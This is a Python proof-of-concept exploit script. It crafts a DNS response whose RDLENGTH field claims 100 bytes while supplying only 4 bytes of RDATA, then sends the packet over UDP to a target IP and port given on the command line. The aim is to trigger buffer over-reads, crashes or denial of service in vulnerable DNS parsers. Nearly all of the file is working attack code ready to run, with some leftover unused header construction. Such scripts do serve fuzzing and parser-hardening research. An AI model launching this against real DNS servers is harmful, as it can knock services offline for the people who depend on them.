#!/usr/bin/env python3
"""
Proof-of-Concept: DNS RDLENGTH Field Manipulation

This script demonstrates a vulnerability where a DNS parser fails to validate
the RDLENGTH field against the actual remaining bytes in the message.
By setting RDLENGTH larger than the provided RDATA, an attacker may trigger
a buffer over-read, heap overflow, or denial of service.

Usage:
    python poc_rdlength_field_manipulation.py <target_ip> [target_port]
"""

import sys
import struct
import socket
import time

def build_malicious_dns_query():
    """
    Constructs a DNS query packet with a malformed Resource Record.
    The RDLENGTH field is set to a value larger than the actual RDATA provided.
    """
    # DNS Header: ID, Flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT
    dns_header = struct.pack('!HHHHHH',
        0x1234,          # Transaction ID
        0x0100,          # Flags: Standard query, recursion desired
        1,               # QDCOUNT: 1 question
        0,               # ANCOUNT: 0 answers (we inject the malformed RR in question for simplicity)
        0,               # NSCOUNT: 0 authority records
        0                # ARCOUNT: 0 additional records
    )

    # Question Section: NAME, TYPE, CLASS
    # We use a simple domain name: 'example.com'
    name = b'\x07example\x03com\x00'
    qtype = struct.pack('!H', 1)   # TYPE A
    qclass = struct.pack('!H', 1)  # CLASS IN

    question = name + qtype + qclass

    # Normally, the question section does not contain RDLENGTH/RDATA.
    # However, to demonstrate the parser vulnerability in the ANSWER/RR section,
    # we will craft a full DNS message with a fake Answer section containing the malformed RR.
    # We adjust QDCOUNT to 0 and ANCOUNT to 1 to place our crafted RR in the answer section.
    dns_header = struct.pack('!HHHHHH',
        0x1234,
        0x8180,          # Flags: Response, No Error (to trick some parsers into processing answers)
        0,               # QDCOUNT
        1,               # ANCOUNT: 1 answer record
        0,               # NSCOUNT
        0                # ARCOUNT
    )

    # Answer Section: NAME, TYPE, CLASS, TTL, RDLENGTH, RDATA
    # NAME: Pointer to the question name or a new name. We'll use a pointer to save space.
    # Since we removed the question, we'll just use a simple name again.
    rr_name = b'\x07example\x03com\x00'
    rr_type = struct.pack('!H', 1)   # TYPE A
    rr_class = struct.pack('!H', 1)  # CLASS IN
    rr_ttl = struct.pack('!I', 300)  # TTL: 300 seconds

    # VULNERABILITY: RDLENGTH is set to 100, but we only provide 4 bytes of RDATA.
    # A compliant parser should detect that the packet ends before 100 bytes of RDATA.
    # A vulnerable parser may read 100 bytes from memory, causing an over-read or crash.
    rdlength = struct.pack('!H', 100)  # Claimed length: 100 bytes
    rdata = struct.pack('!BBBB', 127, 0, 0, 1)  # Actual RDATA: 4 bytes (127.0.0.1)

    answer = rr_name + rr_type + rr_class + rr_ttl + rdlength + rdata

    # Full DNS message
    dns_message = dns_header + answer
    return dns_message

def send_dns_packet(target_ip, target_port, packet):
    """
    Sends the crafted DNS packet to the target using a UDP socket.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)  # 5 second timeout
        sock.sendto(packet, (target_ip, target_port))
        print(f"[*] Sent malicious DNS packet to {target_ip}:{target_port}")
        print(f"[*] Packet size: {len(packet)} bytes")
        print(f"[*] Waiting for response or timeout...")

        try:
            response, addr = sock.recvfrom(1024)
            print(f"[+] Received response from {addr}: {len(response)} bytes")
            # In a real scenario, we might analyze the response for anomalies
        except socket.timeout:
            print("[-] No response received (timeout). This may indicate a crash or drop.")
        except Exception as e:
            print(f"[-] Error receiving response: {e}")
        finally:
            sock.close()

    except Exception as e:
        print(f"[!] Failed to send packet: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_rdlength_field_manipulation.py <target_ip> [target_port]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 53

    print("[*] Crafting malicious DNS packet with inflated RDLENGTH...")
    malicious_packet = build_malicious_dns_query()

    print("[*] Packet structure:")
    print(f"    - Header: Standard DNS response header")
    print(f"    - Answer RR: example.com A record")
    print(f"    - RDLENGTH: 100 (inflated)")
    print(f"    - RDATA: 4 bytes (actual)")
    print(f"    - Mismatch: Parser may read 96 bytes beyond packet boundary")

    send_dns_packet(target_ip, target_port, malicious_packet)

    print("[*] PoC execution complete.")
    print("[*] If the target is vulnerable, it may crash, hang, or return malformed data.")

if __name__ == "__main__":
    main()